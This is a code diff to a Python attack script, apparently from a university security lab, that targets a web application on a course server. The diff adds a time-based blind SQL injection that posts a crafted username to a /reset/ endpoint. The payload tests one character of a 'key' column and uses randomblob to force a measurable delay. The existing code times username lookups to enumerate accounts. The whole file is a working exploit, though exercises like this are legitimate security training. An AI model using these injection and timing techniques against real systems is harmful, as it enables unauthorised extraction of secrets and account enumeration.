@@ -33,11 +33,28 @@ def test_username(username):
   #print(r1.text)
   return time_taken
 
+
+def test_injection():
+  inject_query = "admin' AND substr(key, 1,1) = '^' AND randomblob(400000000) = 453454331000 OR 'username'='"
+  payload= {'username': inject_query, 'Submit':'submit'}
+  #r = requests.get('http://lbs-2020-02.askarov.net:3030/', data=data)
+  start_time = time.time()
+  s = requests.post('http://lbs-2020-02.askarov.net:3030/reset/', payload)
+  time_taken = (time.time() - start_time)
+  # We need to assert if the resultant string is a success
+  #print(r1.text)
+  return time_taken
+
+
+
 def main():
   usernames = get_usernames()
   for user_name in usernames:
     user_time = test_username(user_name)
     print(user_time)
+  inject_time = test_injection()
+  print(inject_time)
+
 
 if __name__== "__main__":
   main()
